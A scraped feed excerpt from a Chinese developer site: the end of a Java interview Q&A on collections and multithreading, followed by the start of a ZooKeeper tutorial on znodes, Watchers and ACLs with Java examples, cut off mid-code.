<li>vector：就比arraylist多了个同步化机制（线程安全），因为效率较低，现在已经不太建议使用。在web应用中，特别是前台页面，往往效率（页面响应速度）是优先考虑的。</li>
<li>statck：堆栈类，先进后出。</li>
<li>hashtable：就比hashmap多了个线程安全。</li>
<li>enumeration：枚举，相当于迭代器。</li>
</ul>
<p><strong>31. 迭代器 Iterator 是什么？</strong><br/>
迭代器是一种设计模式，它是一个对象，它可以遍历并选择序列中的对象，而开发人员不需要了解该序列的底层结构。迭代器通常被称为“轻量级”对象，因为创建它的代价小。<br/>
<strong>32. Iterator 怎么使用？有什么特点？</strong><br/>
(1) 使用方法iterator()要求容器返回一个Iterator。第一次调用Iterator的next()方法时，它返回序列的第一个元素。注意：iterator()方法是java.lang.Iterable接口,被Collection继承。<br/>
(2) 使用next()获得序列中的下一个元素。<br/>
(3) 使用hasNext()检查序列中是否还有元素。<br/>
(4) 使用remove()将迭代器新返回的元素删除。<br/>
Iterator是Java迭代器最简单的实现，为List设计的ListIterator具有更多的功能，它可以从两个方向遍历List，也可以从List中插入和删除元素。<br/>
<strong>33. Iterator 和 ListIterator 有什么区别？</strong><br/>
</p>
<ul>
<li>Iterator可用来遍历Set和List集合，但是ListIterator只能用来遍历List。</li>
<li>Iterator对集合只能是前向遍历，ListIterator既可以前向也可以后向。</li>
<li>ListIterator实现了Iterator接口，并包含其他的功能，比如：增加元素，替换元素，获取前一个和后一个元素的索引，等等。</li>
</ul>
<p>三、<strong>多线程</strong><br/>
<strong>35. 并行和并发有什么区别？</strong><br/>
</p>
<ul>
<li>并行是指两个或者多个事件在同一时刻发生；而并发是指两个或多个事件在同一时间间隔发生。</li>
<li>并行是在不同实体上的多个事件，并发是在同一实体上的多个事件。</li>
<li>在一台处理器上“同时”处理多个任务，在多台处理器上同时处理多个任务。如hadoop分布式集群。</li>
</ul>
<p>所以并发编程的目标是充分的利用处理器的每一个核，以达到最高的处理性能。<br/>
<strong>36. 线程和进程的区别？</strong><br/>
简而言之，进程是程序运行和资源分配的基本单位，一个程序至少有一个进程，一个进程至少有一个线程。线程是进程的一个实体，是cpu调度和分派的基本单位，是比程序更小的能独立运行的基本单位。同一进程中的多个线程之间可以并发执行。<br/>
<strong>37. 守护线程是什么？</strong><br/>
守护线程（即daemon thread），是个服务线程，准确地来说就是服务其他的线程。<br/>
<strong>38. 创建线程有哪几种方式？</strong><br/>
①. 继承Thread类创建线程类<br/>
②. 通过Runnable接口创建线程类<br/>
③. 通过Callable和Future创建线程<br/>
<strong>39. 说一下 runnable 和 callable 有什么区别？</strong><br/>
</p>
<ul>
<li>Runnable接口中的run()方法的返回值是void，它做的事情只是纯粹地去执行run()方法中的代码而已；</li>
<li>Callable接口中的call()方法是有返回值的，是一个泛型，和Future、FutureTask配合可以用来获取异步执行的结果。</li>
</ul>
<p><strong>40. 线程有哪些状态？</strong><br/>
线程通常都有五种状态，创建、就绪、运行、阻塞和死亡。<br/>
<strong>41. sleep() 和 wait() 有什么区别？</strong><br/>
sleep()：方法是线程类（Thread）的静态方法，让调用线程进入睡眠状态，让出执行机会给其他线程，等到休眠时间结束后，线程进入就绪状态和其他线程一起竞争cpu的执行时间。因为sleep() 是static静态的方法，他不能改变对象的机锁，当一个synchronized块中调用了sleep() 方法，线程虽然进入休眠，但是对象的机锁没有被释放，其他线程依然无法访问这个对象。<br/>
wait()：wait()是Object类的方法，当一个线程执行到wait方法时，它就进入到一个和该对象相关的等待池，同时释放对象的机锁，使得其他线程能够访问，可以通过notify，notifyAll方法来唤醒等待的线程。<br/>
<strong>42. notify()和 notifyAll()有什么区别？</strong></p>
<ul>
<li>如果线程调用了对象的 wait()方法，那么线程便会处于该对象的等待池中，等待池中的线程不会去竞争该对象的锁。</li>
<li>当有线程调用了对象的 notifyAll()方法（唤醒所有 wait 线程）或 notify()方法（只随机唤醒一个 wait 线程），被唤醒的的线程便会进入该对象的锁池中，锁池中的线程会去竞争该对象锁。也就是说，调用了notify后只要一个线程会由等待池进入锁池，而notifyAll会将该对象等待池内的所有线程移动到锁池中，等待锁竞争。</li>
<li>优先级高的线程竞争到对象锁的概率大，假若某线程没有竞争到该对象锁，它还会留在锁池中，唯有线程再次调用 wait()方法，它才会重新回到等待池中。而竞争到对象锁的线程则继续往下执行，直到执行完了 synchronized 代码块，它会释放掉该对象锁，这时锁池中的线程会继续竞争该对象锁。</li>
</ul>
<p><strong>43. 线程的 run()和 start()有什么区别？</strong><br/>
start()方法来启动一个线程，真正实现了多线程运行。这时无需等待run方法体代码执行完毕，可以直接继续执行下面的代码； 这时此线程是处于就绪状态， 并没有运行。 然后通过此Thread类调用方法run()来完成其运行状态， 这里方法run()称为线程体，它包含了要执行的这个线程的内容， Run方法运行结束， 此线程终止。然后CPU再调度其它线程。<br/>
run()方法是在本线程里的，只是线程里的一个函数,而不是多线程的。 如果直接调用run(),其实就相当于是调用了一个普通函数而已，直接待用run()方法必须等待run()方法执行完毕才能执行下面的代码，所以执行路径还是只有一条，根本就没有线程的特征，所以在多线程执行时要使用start()方法而不是run()方法。<br/>
<strong>44. 创建线程池有哪几种方式？</strong><br/>
①. newFixedThreadPool(int nThreads)<br/>
创建一个固定长度的线程池，每当提交一个任务就创建一个线程，直到达到线程池的最大数量，这时线程规模将不再变化，当线程发生未预期的错误而结束时，线程池会补充一个新的线程。<br/>
②. newCachedThreadPool()<br/>
创建一个可缓存的线程池，如果线程池的规模超过了处理需求，将自动回收空闲线程，而当需求增加时，则可以自动添加新线程，线程池的规模不存在任何限制。<br/>
③. newSingleThreadExecutor()<br/>
这是一个单线程的Executor，它创建单个工作线程来执行任务，如果这个线程异常结束，会创建一个新的来替代它；它的特点是能确保依照任务在队列中的顺序来串行执行。<br/>
④. newScheduledThreadPool(int corePoolSize)<br/>
创建了一个固定长度的线程池，而且以延迟或定时的方式来执行任务，类似于Timer。<br/>
<strong>45. 线程池都有哪些状态？</strong><br/>
线程池有5种状态：Running、ShutDown、Stop、Tidying、Terminated。<br/>
线程池各个状态切换框架图：<br/>
</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/daedeb56f6214c14b62f57fcc5b7a868~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764483585&amp;x-signature=Ff7z85mg0UU1sVNmHc89hLwavaY%3D" alt="" loading="lazy"/></p>
<p><strong>46. 线程池中 submit()和 execute()方法有什么区别？</strong><br/>
</p>
<ul>
<li>接收的参数不一样</li>
<li>submit有返回值，而execute没有</li>
<li>submit方便Exception处理</li>
</ul>
<p><strong>47. 在 java 程序中怎么保证多线程的运行安全？</strong><br/>
线程安全在三个方面体现：<br/>
</p>
<ul>
<li>原子性：提供互斥访问，同一时刻只能有一个线程对数据进行操作，（atomic,synchronized）；</li>
<li>可见性：一个线程对主内存的修改可以及时地被其他线程看到，（synchronized,volatile）；</li>
<li>有序性：一个线程观察其他线程中的指令执行顺序，由于指令重排序，该观察结果一般杂乱无序，（happens-before原则）。</li>
</ul>
<p><strong>48. 多线程锁的升级原理是什么？</strong><br/>
在Java中，锁共有4种状态，级别从低到高依次为：无状态锁，偏向锁，轻量级锁和重量级锁状态，这几个状态会随着竞争情况逐渐升级。锁可以升级但不能降级。<br/>
锁升级的图示过程：<br/>
</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f7328db561b4fcc98ee1da1a04354e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764483585&amp;x-signature=Ixc2JrO5A0yqUl78A9tDzPIpA6E%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入解析ZooKeeper核心机制]]></title>    <link>https://juejin.cn/post/7575102474639343667</link>    <guid>https://juejin.cn/post/7575102474639343667</guid>    <pubDate>2025-11-22T16:16:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575102474639343667" data-draft-id="7574991051436064778" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入解析ZooKeeper核心机制"/> <meta itemprop="keywords" content="ZooKeeper"/> <meta itemprop="datePublished" content="2025-11-22T16:16:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大头an"/> <meta itemprop="url" content="https://juejin.cn/user/618374030438861"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入解析ZooKeeper核心机制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/618374030438861/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大头an
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T16:16:02.000Z" title="Sat Nov 22 2025 16:16:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读22分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 深入理解 ZooKeeper</h2>
<h3 data-id="heading-1">1.1 什么是 ZooKeeper？</h3>
<blockquote>
<p>ZooKeeper 是一个分布式的、开放源码的<strong>分布式应用程序协调服务</strong>，由雅虎创建，是 Google Chubby 的开源实现。它本质上是一个<strong>分布式小文件存储系统</strong>，专门用于存储和管理分布式系统所需的元数据和配置信息。</p>
</blockquote>
<h3 data-id="heading-2">1.2 核心设计理念</h3>
<p>ZooKeeper 的设计遵循"简单即美"的原则：</p>
<ul>
<li><strong>简单的数据模型</strong>：类似文件系统的树形结构，易于理解和使用</li>
<li><strong>丰富的构建块</strong>：提供分布式应用所需的基本原语和模式</li>
<li><strong>客户端顺序保证</strong>：严格的客户端操作顺序性，确保行为可预测</li>
<li><strong>高性能</strong>：在读多写少的场景下表现优异</li>
</ul>
<h3 data-id="heading-3">1.3 核心特性深度解析</h3>
<h4 data-id="heading-4">1.3.1 原子性（Atomicity）</h4>
<p>在分布式环境中，原子性意味着操作要么在所有节点上成功执行，要么在所有节点上都不执行。ZooKeeper 通过两阶段提交协议保证这一点。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ZooKeeper 保证操作的原子性示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicOperationExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createNodeAtomically</span><span class="hljs-params">(String path, <span class="hljs-type">byte</span>[] data)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 创建节点操作是原子的</span>
        <span class="hljs-comment">// 不会出现部分节点创建成功的情况</span>
        zk.create(path, data, ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);
    }
}
</code></pre>
<h4 data-id="heading-5">1.3.2 顺序一致性（Sequential Consistency）</h4>
<p>ZooKeeper 为所有事务分配全局唯一且递增的事务ID（Zxid），确保：</p>
<ul>
<li>所有事务按 Zxid 顺序执行</li>
<li>客户端能看到相同顺序的事务视图</li>
<li>写操作线性化，读操作可能看到稍旧的数据</li>
</ul>
<h4 data-id="heading-6">1.3.3 可靠性（Reliability）</h4>
<ul>
<li><strong>数据持久化</strong>：所有更新都会持久化到磁盘</li>
<li><strong>自动恢复</strong>：支持数据快照和事务日志，提供自动恢复机制</li>
<li><strong>故障容错</strong>：单点故障不会影响整体服务可用性</li>
</ul>
<h4 data-id="heading-7">1.3.4 单一系统映像</h4>
<p>无论客户端连接到哪个 ZooKeeper 服务器，看到的都是统一的数据视图，这简化了客户端的逻辑处理。</p>
<h2 data-id="heading-8">2. ZooKeeper 数据模型深度剖析</h2>
<h3 data-id="heading-9">2.1 Znode 树形结构详解</h3>
<p>ZooKeeper 的数据模型采用类似文件系统的树形结构，每个节点称为 Znode。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    ROOT[/zookeeper] --&gt; QUOTA[/quota]
    ROOT --&gt; CONFIG[/config]
    
    subgraph "应用命名空间示例"
        APP[/app] --&gt; APP_SERVICE1[/service1]
        APP --&gt; APP_SERVICE2[/service2]
        APP_SERVICE1 --&gt; S1_CONFIG[config]
        APP_SERVICE1 --&gt; S1_LOCKS[/locks]
        APP_SERVICE1 --&gt; S1_MEMBERS[/members]
        APP_SERVICE1 --&gt; S1_QUEUES[/queues]
        
        S1_LOCKS --&gt; LOCK1[lock-0000000001]
        S1_LOCKS --&gt; LOCK2[lock-0000000002]
        S1_MEMBERS --&gt; MEMBER1[192.168.1.1:8080]
        S1_MEMBERS --&gt; MEMBER2[192.168.1.2:8080]
        S1_QUEUES --&gt; QUEUE1[message-0000000001]
        S1_QUEUES --&gt; QUEUE2[message-0000000002]
    end
</code></pre>
<h3 data-id="heading-10">2.2 Znode 内部结构深度解析</h3>
<p>每个 Znode 由三个核心部分组成：</p>
<h4 data-id="heading-11">2.2.1 Stat 状态信息</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Stat</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> czxid;          <span class="hljs-comment">// 创建该节点的事务ID</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> mzxid;          <span class="hljs-comment">// 最后修改该节点的事务ID</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> ctime;          <span class="hljs-comment">// 创建时间戳</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> mtime;          <span class="hljs-comment">// 最后修改时间戳</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> version;         <span class="hljs-comment">// 数据版本号（每次写操作递增）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> cversion;        <span class="hljs-comment">// 子节点版本号（子节点变化时递增）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> aversion;        <span class="hljs-comment">// ACL版本号</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> ephemeralOwner; <span class="hljs-comment">// 临时节点所有者会话ID</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> dataLength;      <span class="hljs-comment">// 数据长度（最大1MB）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> numChildren;     <span class="hljs-comment">// 子节点数量</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> pzxid;          <span class="hljs-comment">// 最后修改子节点的事务ID</span>
}
</code></pre>
<h4 data-id="heading-12">2.2.2 Data 数据存储</h4>
<p>ZooKeeper 设计用于存储配置信息和元数据，而非大容量业务数据：</p>
<ul>
<li><strong>数据大小限制</strong>：每个 Znode 最大 1MB</li>
<li><strong>适用场景</strong>：配置信息、状态标志、序列号等小数据</li>
<li><strong>存储格式</strong>：字节数组，由应用层解析</li>
</ul>
<h4 data-id="heading-13">2.2.3 Children 子节点信息</h4>
<p>维护当前节点的所有子节点列表，支持快速的子节点遍历和监控。</p>
<h3 data-id="heading-14">2.3 节点类型深度分析</h3>
<h4 data-id="heading-15">2.3.1 永久节点（Persistent Nodes）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建永久节点示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PersistentNodeExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createPersistentNode</span><span class="hljs-params">(String path, String configData)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 创建存储配置信息的永久节点</span>
        zk.create(path, 
                 configData.getBytes(),
                 ZooDefs.Ids.OPEN_ACL_UNSAFE,
                 CreateMode.PERSISTENT);
    }
}
</code></pre>
<p><strong>特点与应用场景</strong>：</p>
<ul>
<li><strong>持久化存储</strong>：显式删除才会消失</li>
<li><strong>支持子节点</strong>：可以创建复杂的目录结构</li>
<li><strong>适用场景</strong>：系统配置、服务元数据、静态信息存储</li>
</ul>
<h4 data-id="heading-16">2.3.2 临时节点（Ephemeral Nodes）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建临时节点 - 用于服务注册和存活检测</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EphemeralNodeExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerService</span><span class="hljs-params">(String serviceName, String endpoint)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">servicePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/services/"</span> + serviceName;
        
        <span class="hljs-comment">// 创建临时节点，会话结束自动清理</span>
        zk.create(servicePath + <span class="hljs-string">"/instance-"</span>,
                 endpoint.getBytes(),
                 ZooDefs.Ids.OPEN_ACL_UNSAFE,
                 CreateMode.EPHEMERAL_SEQUENTIAL);
    }
}
</code></pre>
<p><strong>特点与应用场景</strong>：</p>
<ul>
<li><strong>会话绑定</strong>：创建者会话结束自动删除</li>
<li><strong>无子节点</strong>：临时节点不能创建子节点</li>
<li><strong>适用场景</strong>：服务注册发现、会话管理、存活检测</li>
</ul>
<h4 data-id="heading-17">2.3.3 有序节点（Sequential Nodes）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建有序节点 - 用于分布式锁和队列</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SequentialNodeExample</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">createSequentialNode</span><span class="hljs-params">(String basePath)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 创建有序节点，ZooKeeper自动添加序列号</span>
        <span class="hljs-keyword">return</span> zk.create(basePath + <span class="hljs-string">"-"</span>,
                        <span class="hljs-literal">null</span>,
                        ZooDefs.Ids.OPEN_ACL_UNSAFE,
                        CreateMode.EPHEMERAL_SEQUENTIAL);
        <span class="hljs-comment">// 返回路径如：/locks/lock-0000000001</span>
    }
}
</code></pre>
<p><strong>命名规则与特性</strong>：</p>
<ul>
<li><strong>自动序列号</strong>：ZooKeeper 自动在节点名后添加10位数字序列号</li>
<li><strong>全局有序</strong>：序列号全局单调递增，保证顺序性</li>
<li><strong>组合类型</strong>：可与永久/临时节点组合使用</li>
</ul>
<h3 data-id="heading-18">2.4 Watcher 机制深度解析</h3>
<p>Watcher 是 ZooKeeper 实现分布式协调的核心机制，允许客户端在节点发生变化时接收通知。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdvancedWatcherExample</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Watcher</span> {
    <span class="hljs-keyword">private</span> ZooKeeper zk;
    <span class="hljs-keyword">private</span> Map&lt;String, List&lt;Watcher&gt;&gt; customWatchers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">(WatchedEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> event.getPath();
        Event.<span class="hljs-type">EventType</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> event.getType();
        Event.<span class="hljs-type">KeeperState</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> event.getState();
        
        System.out.println(<span class="hljs-string">"Watcher触发: "</span> + event.toString());
        
        <span class="hljs-keyword">switch</span> (type) {
            <span class="hljs-keyword">case</span> NodeCreated:
                handleNodeCreated(path);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> NodeDeleted:
                handleNodeDeleted(path);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> NodeDataChanged:
                handleNodeDataChanged(path);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> NodeChildrenChanged:
                handleNodeChildrenChanged(path);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> None:
                handleSessionEvent(state);
                <span class="hljs-keyword">break</span>;
        }
        
        <span class="hljs-comment">// 重新注册Watcher（一次性特性）</span>
        reRegisterWatcher(path, type);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reRegisterWatcher</span><span class="hljs-params">(String path, Event.EventType type)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">switch</span> (type) {
                <span class="hljs-keyword">case</span> NodeDataChanged:
                <span class="hljs-keyword">case</span> NodeCreated:
                <span class="hljs-keyword">case</span> NodeDeleted:
                    zk.exists(path, <span class="hljs-built_in">this</span>);
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> NodeChildrenChanged:
                    zk.getChildren(path, <span class="hljs-built_in">this</span>);
                    <span class="hljs-keyword">break</span>;
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<p><strong>Watcher 核心特性</strong>：</p>
<ol>
<li>
<p><strong>一次性触发</strong>：</p>
<ul>
<li>触发后自动失效，需要重新注册</li>
<li>避免大量无效通知，减少网络开销</li>
<li>确保客户端主动关注重要变化</li>
</ul>
</li>
<li>
<p><strong>轻量级设计</strong>：</p>
<ul>
<li>服务端不存储完整的监听器信息</li>
<li>基于会话的临时注册</li>
<li>支持大规模客户端连接</li>
</ul>
</li>
<li>
<p><strong>有序通知</strong>：</p>
<ul>
<li>保证事件通知的顺序性与发生顺序一致</li>
<li>避免竞态条件和数据不一致</li>
</ul>
</li>
<li>
<p><strong>会话一致性</strong>：</p>
<ul>
<li>Watcher 与创建它的会话绑定</li>
<li>会话过期后所有相关 Watcher 自动清理</li>
</ul>
</li>
</ol>
<h3 data-id="heading-19">2.5 访问控制列表（ACL）深度解析</h3>
<p>ZooKeeper 提供细粒度的访问控制，保护数据安全。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ACLExample</span> {
    <span class="hljs-comment">// 创建自定义ACL</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createSecureNode</span><span class="hljs-params">(String path, <span class="hljs-type">byte</span>[] data)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 定义ACL列表</span>
        List&lt;ACL&gt; acls = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-comment">// 添加digest认证</span>
        <span class="hljs-type">Id</span> <span class="hljs-variable">user1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Id</span>(<span class="hljs-string">"digest"</span>, <span class="hljs-string">"user1:password1"</span>);
        acls.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ACL</span>(ZooDefs.Perms.READ | ZooDefs.Perms.WRITE, user1));
        
        <span class="hljs-comment">// 添加IP限制</span>
        <span class="hljs-type">Id</span> <span class="hljs-variable">ipRestriction</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Id</span>(<span class="hljs-string">"ip"</span>, <span class="hljs-string">"192.168.1.100"</span>);
        acls.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ACL</span>(ZooDefs.Perms.READ, ipRestriction));
        
        zk.create(path, data, acls, CreateMode.PERSISTENT);
    }
    
    <span class="hljs-comment">// 认证示例</span>
